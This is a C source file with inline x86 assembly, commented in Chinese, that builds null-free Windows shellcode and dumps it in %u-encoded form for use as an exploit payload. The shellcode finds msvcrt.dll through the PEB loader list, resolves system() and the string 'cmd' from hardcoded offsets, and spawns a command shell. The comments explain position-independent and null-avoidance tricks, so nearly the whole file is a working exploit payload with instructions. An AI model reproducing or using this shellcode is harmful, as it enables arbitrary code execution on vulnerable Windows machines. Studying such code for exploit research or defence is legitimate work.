#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <Windows.h>

void dump_shellcode()
{
	char *codeStart, *codeEnd;
	int codeLen = 0;

	//HMODULE h = LoadLibrary(TEXT("msvcrt.dll"));

	//_asm jmp __CODE_START__; // goto shellcode, for debugging

	//_asm nop; // 调整, 使得编译出来的shellcode中不含0x00
	__asm
	{
		mov eax, __CODE_START__;
		mov codeStart, eax;
		mov eax, __CODE_END__;
		mov codeEnd, eax;
	}
	codeLen = codeEnd - codeStart;

	FILE *f1 = fopen("shellcode.txt", "w");
	fprintf(f1, "codeLen: %d\n", codeLen);
	while (codeLen >= 2) {
		fprintf(f1, "%%u%.2x%.2x",
			(unsigned char)codeStart[1],
			(unsigned char)codeStart[0]);
		codeStart += 2;
		codeLen -= 2;
	}
	if (codeLen == 1) {
		fprintf(f1, "%%u00%.2x", (unsigned char)codeStart[0]);
	}
	fclose(f1);
	return;

__CODE_START__:
	__asm
	{
		/*********************************************************/
		/*                    CODE_ENTRY                         */
		/*********************************************************/
	CODE_ENTRY:
		/* 0 */	_EMIT 0xE8;
		/* 1 */	_EMIT 0xFF;
		/* 2 */	_EMIT 0xFF;
		/* 3 */	_EMIT 0xFF;
		/* 4 */	_EMIT 0xFF; // call 0xFFFFFFFF
	LABEL_BASE:
		/* 5 */	_EMIT 0xC2;
		/* 6 */	_EMIT 0x59;
		/* 7 */	_EMIT 0x90;
		// "call -1"后LABEL_BASE的地址被压栈, 然后eip指向标号4, 将标号4和5的"FFC2"译码成"inc edx";
		// 然后执行标号6的"pop ecx"(59), 将保存在栈顶的LABEL_BASE的地址pop进ecx; 之后执行标号7的"nop"(90).
		// 至此实现了自定位――LABEL_BASE的地址被保存在ecx
	_GetLibcBaseAddress:
		xor ebx, ebx;
		mov eax, fs:[ebx + 0x30]; // linear address of PEB (直接"mov eax,fs:[0x30]"会使代码中出现0x00)
		mov eax, [eax + 0xc]; // 从PEB结构体偏移0xc处取得PEB_LDR_DATA结构体的地址
		mov ebx, [eax + 0xc]; // ebx <- 第一个LDR_MODULE的地址
		mov edx, ebx; // edx保存循环链表的头地址
	SEARCH_MODULE_LOOP:
		mov eax, ebx;
		add eax, 0x2C + 0x4; // LDR_MODULE偏移0x2C处是BaseDllName, 一个UNICODE_STRING, 其中偏移0x4处是一个指向UNICODE字符串的指针
		mov esi, [eax];
		mov edi, LIBC_NAME;
		sub edi, LABEL_BASE; // 这两个label的地址中不能出现0x00, 如果有就重新编译知道满足要求
		add edi, ecx;
		/*********************************************************/
		/*        bool _strcmp(wchar *s1, char *s2)              */
		/*        - args: esi = s1, edi = s2(end with '$')       */
		/*        - ret: al=1 if equal, al=0 if NOT equal        */
		/*********************************************************/
		// 这里本可以写成"call _strcmp", 但是这样会在代码中出现0x00, 所以直接将函数嵌入进来
	_strcmp:
		push ebx;
	LOOP_CMP_STRCMP:
		mov al, [esi];
		mov bl, [edi];
		cmp al, bl;
		je CONTINUE_STRCMP;
		test al, al;
		jnz NOT_EQUAL_STRCMP;
		cmp bl, '$'; // 两个字符串同时结束时al=0,bl='$'
		jne NOT_EQUAL_STRCMP;
		xor al, al;
		inc al; // equal (这两条指令用于替代"mov al,1")
		jmp END_STRCMP;
	CONTINUE_STRCMP:
		inc esi;
		inc esi; // 两个"inc esi"一共2字节,一个"add esi,2"却需要3字节
		inc edi;
		jmp LOOP_CMP_STRCMP;
	NOT_EQUAL_STRCMP:
		xor al, al; // not equal
	END_STRCMP:
		pop ebx;
		/******************** end of _strcmp ********************/
		cmp al, 1; // al==1 equal; al==0 not equal
		je MODULE_FOUND;
		mov ebx, [ebx];
		cmp ebx, edx;
		je MODULE_NOT_FOUND; // 循环链表已经遍历完了
		jmp SEARCH_MODULE_LOOP;
	MODULE_FOUND:
		mov eax, [ebx + 0x18]; // LDR_MODULE偏移0x18处是模块的线性基地址BaseAddress
	_GetSystemFuncEntry:
		mov ebx, eax;
		sub ebx, 0xfffe6c77;
		sub eax, 0xfffa4e91; // 用sub替换add, 使得代码中没有0x00. 加上一个数 <=> 减去这个数的相反数
		//add ebx, 0x19389; // 0x19389是msvcrt.dll中字符串"cmd"的RVA
		//add eax, 0x5b16f; // 0x5b16f是msvcrt.dll的export address table中记录的system函数的入口RVA
		push ebx;
		call eax; // 获得shell之后就结束了, 不必关注调用结束后的事情
	MODULE_NOT_FOUND:
		jmp MODULE_NOT_FOUND; // endless loop
		/*********************************************************/
		/*                      Data                             */
		/*********************************************************/
	LIBC_NAME:
		_EMIT 'm';
		_EMIT 's';
		_EMIT 'v';
		_EMIT 'c';
		_EMIT 'r';
		_EMIT 't';
		_EMIT '.';
		_EMIT 'd';
		_EMIT 'l';
		_EMIT 'l';
		_EMIT '$'; // '$'作为结束符, 因为shellcode中不能出现0x00
	}
__CODE_END__:
	return;
}

int main()
{
	dump_shellcode();
}